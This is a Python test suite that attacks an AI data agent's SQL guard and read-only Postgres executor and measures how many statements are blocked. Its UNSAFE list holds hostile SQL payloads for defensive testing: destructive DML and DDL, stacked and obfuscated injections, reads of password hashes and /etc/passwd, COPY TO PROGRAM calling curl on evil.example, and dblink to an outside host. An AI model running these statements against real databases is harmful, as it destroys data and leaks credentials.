"""SQL safety suite: attack the Guard, then attack the database directly with the Guard bypassed.

* Guard pass rate: every unsafe statement must be rejected before it reaches the database.
* Isolation pass rate: for the classes the *database* is meant to stop on its own (writes, DDL,
  other schemas, server files, privilege changes) the read-only executor must refuse the statement
  with the Guard bypassed, and row counts and tables must be unchanged afterwards.
* Benign acceptance: every reference query of the evaluation set must pass the Guard.
"""

from __future__ import annotations

import asyncio
import time
import uuid
from collections import defaultdict
from typing import Any

from sqlalchemy import select
from sqlalchemy.orm import selectinload

from app.agent.tools.executor import PostgresExecutor
from app.agent.tools.schema import DatasetCatalog, SchemaTools
from app.agent.tools.sql_guard import validate_sql
from app.core.config import Settings
from app.db.engines import open_databases
from app.db.models import Dataset, DatasetTable
from evals.cases import CASES
from evals.harness import _snapshot, open_env

# (sql, category, enforced_by_database_too)
UNSAFE: list[tuple[str, str, bool]] = [
    ("DELETE FROM orders", "dml", True),
    ("DELETE FROM order_items WHERE quantity > 0", "dml", True),
    ("UPDATE orders SET status = 'refunded'", "dml", True),
    ("UPDATE customers SET email = 'x@y.z' WHERE customer_id = 1", "dml", True),
    ("INSERT INTO orders (order_id, customer_id, status) VALUES (999999, 1, 'x')", "dml", True),
    ("INSERT INTO products SELECT * FROM products", "dml", True),
    (
        "MERGE INTO orders o USING payments p ON o.order_id = p.order_id WHEN MATCHED THEN DELETE",
        "dml",
        True,
    ),
    ("WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d", "dml", True),
    ("DROP TABLE orders", "ddl", True),
    ("DROP TABLE IF EXISTS customers CASCADE", "ddl", True),
    ("TRUNCATE order_items", "ddl", True),
    ("ALTER TABLE orders ADD COLUMN pwned int", "ddl", True),
    ("ALTER TABLE orders RENAME TO orders_old", "ddl", True),
    ("CREATE TABLE exfil AS SELECT * FROM customers", "ddl", True),
    ("CREATE VIEW v AS SELECT * FROM customers", "ddl", True),
    ("CREATE INDEX ix_x ON orders (status)", "ddl", True),
    ("CREATE SCHEMA evil", "ddl", True),
    ("DROP SCHEMA public CASCADE", "ddl", True),
    ("SELECT * INTO stolen FROM customers", "ddl", True),
    ("SELECT 1; DROP TABLE orders", "stacked", True),
    ("SELECT 1; DELETE FROM orders", "stacked", True),
    ("SELECT COUNT(*) FROM orders; UPDATE orders SET status = 'x'", "stacked", True),
    ("SELECT 1 /* ; */; DROP TABLE customers", "stacked", True),
    ("SELECT * FROM orders; SELECT * FROM customers", "stacked", True),
    ("SELECT * FROM orders FOR UPDATE", "locking", True),
    ("SELECT * FROM customers FOR SHARE", "locking", True),
    ("SELECT * FROM app.users", "cross_schema", True),
    ("SELECT email, password_hash FROM app.users", "cross_schema", True),
    ("SELECT * FROM ds_ffffffffffffffffffffffffffffffff.orders", "cross_schema", True),
    ("SELECT * FROM pg_catalog.pg_shadow", "cross_schema", True),
    ("SELECT * FROM pg_catalog.pg_roles", "system_catalog", False),
    ("SELECT * FROM information_schema.tables", "system_catalog", False),
    ("SELECT * FROM information_schema.columns", "system_catalog", False),
    ("SELECT datname FROM pg_database", "system_catalog", False),
    ("SELECT * FROM pg_stat_activity", "system_catalog", False),
    ("SELECT * FROM pg_settings", "system_catalog", False),
    ("SELECT pg_read_file('/etc/passwd')", "file_access", True),
    ("SELECT pg_ls_dir('/')", "file_access", True),
    ("SELECT lo_import('/etc/passwd')", "file_access", True),
    ("COPY orders TO '/tmp/orders.csv'", "file_access", True),
    ("COPY (SELECT 1) TO PROGRAM 'curl http://evil.example'", "file_access", True),
    ("COPY orders FROM '/etc/passwd'", "file_access", True),
    ("SET ROLE sageboard_owner", "privilege", True),
    ("RESET ROLE", "privilege", True),
    ("GRANT ALL ON orders TO PUBLIC", "privilege", True),
    ("REVOKE SELECT ON orders FROM PUBLIC", "privilege", True),
    ("SELECT set_config('role', 'sageboard_owner', false)", "privilege", False),
    ("SELECT pg_sleep(60)", "dos", False),
    ("SELECT * FROM generate_series(1, 1000000000)", "dos", False),
    ("SELECT repeat('x', 1000000000)", "dos", False),
    (
        "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM t) SELECT * FROM t",
        "dos",
        False,
    ),
    ("SELECT * FROM orders a, orders b, orders c, order_items d", "dos", False),
    ("SELECT version()", "info_leak", False),
    ("SELECT current_user", "info_leak", False),
    ("SELECT current_setting('server_version')", "info_leak", False),
    ("SELECT inet_server_addr()", "info_leak", False),
    ("SELECT pg_backend_pid()", "info_leak", False),
    ("SELECT dblink('host=evil dbname=x', 'SELECT 1')", "exfiltration", False),
    ("VACUUM orders", "command", True),
    ("LISTEN secrets", "command", True),
    ("DO $$ BEGIN DELETE FROM orders; END $$", "command", True),
    ("CALL pg_terminate_backend(1)", "command", True),
    ("PREPARE p AS DELETE FROM orders", "command", True),
    ("sElEcT 1; dRoP tAbLe orders", "obfuscation", True),
    ("SELECT 1;/**/DROP/**/TABLE/**/orders", "obfuscation", True),
    ("SELECT 1; DROP TABLE orders", "obfuscation", True),
    ("DELETE\nFROM\torders", "obfuscation", True),
    ("-- harmless\nDROP TABLE orders", "obfuscation", True),
    ("SELECT $$x$$; DROP TABLE orders", "obfuscation", True),
]

# Statements the database is documented to refuse even with no Guard: expected SQLSTATE classes.
DB_REFUSAL_STATUSES = {"error", "timeout", "cancelled"}


def _catalog(settings: Settings, dataset_id: str) -> tuple[DatasetCatalog, str, str]:
    async def go() -> tuple[DatasetCatalog, str, str]:
        databases = await open_databases(settings)
        try:
            assert databases.sessions is not None
            async with databases.sessions() as db:
                dataset = await db.scalar(
                    select(Dataset)
                    .where(Dataset.id == uuid.UUID(dataset_id))
                    .options(
                        selectinload(Dataset.tables).selectinload(DatasetTable.columns),
                        selectinload(Dataset.relationships),
                    )
                )
                assert dataset is not None
                return (
                    DatasetCatalog.from_dataset(dataset),
                    dataset.schema_name,
                    dataset.reader_role,
                )
        finally:
            await databases.close()

    return asyncio.run(go())


async def _isolation(
    settings: Settings, schema: str, role: str, dataset_id: str
) -> list[dict[str, Any]]:
    databases = await open_databases(settings)
    try:
        assert databases.executor is not None
        executor = PostgresExecutor(
            databases.executor, schema=schema, reader_role=role, max_rows=100, timeout_ms=1500
        )
        out = []
        for sql, category, enforced in UNSAFE:
            if not enforced:
                continue
            before = await _snapshot(settings, dataset_id)
            outcome = await executor.run(sql)
            after = await _snapshot(settings, dataset_id)
            out.append(
                {
                    "sql": sql,
                    "category": category,
                    "refused": outcome.status in DB_REFUSAL_STATUSES,
                    "status": outcome.status,
                    "sqlstate": outcome.error_code,
                    "unchanged": before == after,
                }
            )
        return out
    finally:
        await databases.close()


def run_safety(settings: Settings, scale: str = "small") -> dict[str, Any]:
    with open_env(settings, "oracle", scale) as env:
        catalog, schema, role = _catalog(settings, env.dataset_id)
        policy = SchemaTools(catalog).guard_policy(max_rows=5000)

        by_cat: dict[str, list[bool]] = defaultdict(list)
        misses = []
        durations = []
        for sql, category, _ in UNSAFE:
            t0 = time.perf_counter()
            res = validate_sql(sql, policy)
            durations.append((time.perf_counter() - t0) * 1e6)
            blocked = not res.ok
            by_cat[category].append(blocked)
            if not blocked:
                misses.append({"sql": sql, "category": category})

        benign = []
        for case in CASES:
            for i, step in enumerate(case.steps, 1):
                res = validate_sql(step.sql, policy)
                benign.append(
                    {
                        "id": f"{case.id}.s{i}",
                        "ok": res.ok,
                        "codes": [v.code for v in res.violations],
                    }
                )

        iso = asyncio.run(_isolation(settings, schema, role, env.dataset_id))
        iso_pass = [r for r in iso if r["refused"] and r["unchanged"]]
        return {
            "guard": {
                "total": len(UNSAFE),
                "blocked": sum(sum(v) for v in by_cat.values()),
                "by_category": {
                    k: {"n": len(v), "blocked": sum(v)} for k, v in sorted(by_cat.items())
                },
                "misses": misses,
                "median_us": sorted(durations)[len(durations) // 2],
            },
            "isolation": {
                "total": len(iso),
                "refused_and_unchanged": len(iso_pass),
                "failures": [r for r in iso if r not in iso_pass],
                "statuses": sorted({(r["status"], r["sqlstate"]) for r in iso}, key=str),
            },
            "benign": {
                "total": len(benign),
                "accepted": sum(b["ok"] for b in benign),
                "rejected": [b for b in benign if not b["ok"]],
            },
        }
